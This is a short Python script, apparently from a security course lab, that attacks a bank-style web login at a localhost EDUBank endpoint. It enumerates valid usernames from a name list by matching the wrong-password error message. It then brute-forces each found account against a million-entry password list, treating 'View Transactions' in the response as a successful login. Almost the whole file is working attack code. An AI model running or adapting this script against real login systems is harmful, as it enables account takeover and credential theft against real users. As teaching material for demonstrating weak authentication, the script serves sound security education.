import requests
import time
import datetime

# Change the port number in the below URL, as per your environment.
targetUrl='http://localhost:8080/EDUBank/authenticateCustomer'
dictionary='names.txt'
#passwordList='passwords.txt'
passwordList='millionPasswords.txt'
trialPassword='Dummy!123'

knownUsernameList = []
trialPasswordList=[]
knownUsernamePasswordList = []
passwordCount=0

count=0
found=0


try:
    fp = open(dictionary,'r')
    word=fp.readline()
    startTime=time.time()

    while word:
        count=count+1
        trialLoginName=word.rstrip("\r\n")

        formData={'loginName':trialLoginName,'password':trialPassword}
        r = requests.post(targetUrl,formData)

        if 'Password is incorrect. Retry!!!' in r.text:
            found=found+1
            knownUsernameList.append(word)
            print(trialLoginName)

        word=fp.readline()

    endTime=time.time()

    print("-----STATS------")
    print("Start Time : ",datetime.datetime.fromtimestamp(startTime).strftime('%Y-%m-%d %H:%M:%S'))
    print("End Time   : ",datetime.datetime.fromtimestamp(endTime).strftime('%Y-%m-%d %H:%M:%S'))
    print("Elapsed Time (seconds) : ",endTime-startTime)
    print("Trials : ",count)
    print("Users found: ",found)
    print("----------------")

    #Added by Franky Yeung in 8/27/2019
    #It pass the password file into an array, and try the password using POST request

    fp2 = open(passwordList,'r')
    password=fp2.readline()
    while password:
        trialPasswordList.append(password)
        #print(password)
        password=fp2.readline()

    for username in knownUsernameList:
        trialLoginName=username.rstrip("\r\n")
        print("-----------")
        print("Start to search the password for ",trialLoginName)
        for password in trialPasswordList:
            trialPassword=password.rstrip("\r\n")
            formData={'loginName':trialLoginName,'password':trialPassword}
            r = requests.post(targetUrl,formData)
            #print("Trying",password)

            if 'View Transactions' in r.text:
                print("Successful to search for password!",trialLoginName+trialPassword)
                knownUsernamePasswordList.append(formData)
                print("Result: ",knownUsernamePasswordList)
                break
    
finally:
    print(knownUsernamePasswordList)
    print("done")
